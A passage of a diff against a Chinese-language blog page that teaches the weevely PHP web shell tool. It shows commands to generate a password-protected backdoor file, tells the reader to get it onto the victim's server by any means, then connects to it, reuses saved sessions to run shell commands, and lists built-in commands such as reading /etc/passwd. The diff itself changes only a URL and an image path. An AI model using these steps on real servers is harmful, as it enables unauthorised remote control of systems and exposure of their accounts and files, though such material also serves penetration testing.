@@ -8,12 +8,12 @@
 </code></pre></div></div><h2 id="4-使用">4. 使用</h2><h3 id="41-生成php后门文件">4.1 生成php后门文件</h3><div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># weevely generate &lt;连接密码&gt; &lt;后门保存路径&gt;</span>
 weevely generate 123321 /root/b.php
 </code></pre></div></div><h3 id="42-上传后门文件">4.2 上传后门文件</h3><p>无论你用什么方式，只要把后门文件放到对方服务器中，且通过浏览器能访问到，可能是白板，但不会有404错误。</p><h3 id="43-shell连接后门文件">4.3 shell连接后门文件</h3><div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># weevely &lt;服务器后面HTTP路径&gt; &lt;连接密码&gt;</span>
-weevely http://vinny.cc/b.php 123321
-</code></pre></div></div><p><img src="http://ohdpyqlwy.bkt.clouddn.com/weevely-1.png" alt="weevely" /></p><blockquote><p><strong>weevely</strong>可以保存连接的<strong>session</strong>，此<strong>session</strong>并非是http里会话的概念，weevely的session保存的是站点的连接信息，通常情况下会保存在”~/.weevely/sessions/站点域名/后面文件名_x.session”中，如：”/root/.weevely/sessions/www.wangjunneil.com/b_0.session”。那么在下次连接到后面时可以通过此session文件进行连接，如下：</p></blockquote><div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># weevely session &lt;session文件路径&gt; &lt;shell命令&gt;</span>
+weevely //vinny.cc/b.php 123321
+</code></pre></div></div><p><img src="/vinnycc.oss-cn-shanghai.aliyuncs.com/20190320/weevely-1.png" alt="weevely" /></p><blockquote><p><strong>weevely</strong>可以保存连接的<strong>session</strong>，此<strong>session</strong>并非是http里会话的概念，weevely的session保存的是站点的连接信息，通常情况下会保存在”~/.weevely/sessions/站点域名/后面文件名_x.session”中，如：”/root/.weevely/sessions/www.wangjunneil.com/b_0.session”。那么在下次连接到后面时可以通过此session文件进行连接，如下：</p></blockquote><div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># weevely session &lt;session文件路径&gt; &lt;shell命令&gt;</span>
 weevely session /root/.weevely/sessions/www.wangjunneil.com/b_0.session
 weevely session /root/.weevely/sessions/www.wangjunneil.com/b_0.session <span class="nb">ls</span> <span class="nt">-al</span>
 </code></pre></div></div><h2 id="5-weevely内部命令">5. weevely内部命令</h2><div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>weevely&gt; help
- 
+
  :audit_filesystem     审计系统文件错误的权限
  :audit_etcpasswd      查看linux系统下/etc/passwd的口令文件
  :audit_phpconf        查看当前系统php的配置信息
